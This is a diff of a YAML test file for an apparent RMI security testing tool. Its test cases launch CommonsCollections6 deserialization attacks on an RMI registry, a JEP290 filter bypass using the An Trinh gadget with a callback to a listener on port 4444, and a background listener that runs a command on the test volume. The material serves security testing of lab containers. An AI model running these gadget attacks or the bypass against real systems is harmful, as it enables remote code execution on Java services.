@@ -1,12 +1,17 @@
 tester:
-  name: reg
   title: Registry Tests
-  description: >
-    "Performs tests on remote-methods-guessers 'reg' action."
+  description: |-
+    'Perform tests for the serial action on an RMI registry endpoint.'
+
+  id: '002-010'
+  groups:
+    - reg
+    - serial
+  id_pattern: '002-010-{:03}'
 
 
 variables:
-  file: reg-bypass.txt
+  file: jdk9-reg-bypass.txt
 
 
 plugins:
@@ -15,60 +20,84 @@ plugins:
       background: True
       cmd:
         - rmg
+        - listen
         - 0.0.0.0
         - 4444
-        - listen
         - CommonsCollections6
         - 'touch ${volume-d}/${file}'
 
 
 tests:
   - title: Gadget Call
-    description: >
+    description: |-
       'Attempts a deserialization attack on the registry endpoint.'
       'This should fail, as the server has JEP290 installed.'
 
-    command: '${BASE-CMD}'
-    arguments:
-      - reg
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET}
       - CommonsCollections6
       - ls
+      - --component
+      - reg
+      - ${OPTIONS}
+
     validators:
       - error: False
       - contains:
           values:
-            - rejected deserialization
-            - JEP290 is installed
+            - Registry rejected deserialization
+            - The supplied gadget did not pass the deserialization filter
 
 
   - title: Gadget Call (SSL)
-    description: >
+    description: |-
       'Attempts a deserialization attack on the registry endpoint.'
       'This should fail, as the server has JEP290 installed.'
 
-    command: '${BASE-CMD-SSL}'
-    arguments:
-      - reg
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET-SSL}
       - CommonsCollections6
       - ls
+      - --component
+      - reg
+      - ${OPTIONS}
+
     validators:
       - error: False
       - contains:
           values:
-            - rejected deserialization
-            - JEP290 is installed
+            - Registry rejected deserialization
+            - The supplied gadget did not pass the deserialization filter
 
 
   - title: JEP290 Bypass
-    description: >
+    description: |-
       'Attempts a deserialization attack on the registry endpoint,'
       'using the An Trinh bypass gadget.'
 
-    command: '${BASE-CMD-SSL}'
-    arguments:
-      - reg
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET}
       - AnTrinh
       - ${DOCKER-GW}:4444
+      - --component
+      - reg
+      - ${OPTIONS}
+
     validators:
       - error: False
       - contains:
